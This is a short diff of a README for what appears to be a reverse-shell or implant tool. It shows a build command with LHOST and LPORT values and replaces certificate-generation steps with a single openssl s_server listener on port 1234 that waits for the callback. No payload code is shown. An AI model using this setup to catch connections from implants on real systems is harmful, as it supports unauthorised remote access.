@@ -49,10 +49,7 @@ $ make linux32 LHOST=192.168.0.12 LPORT=1234
 On the server side, you can use the openssl integrated TLS server:
 
 ```bash
-# Certificate and private key generation
-$ openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
-# Start the server
-$ openssl s_server -cert /tmp/cert.pem -key /tmp/key.pem -accept 1234
+$ openssl s_server -cert server.pem -key server.key -accept 1234
 Using default temp DH parameters
 ACCEPT
 bad gethostbyaddr
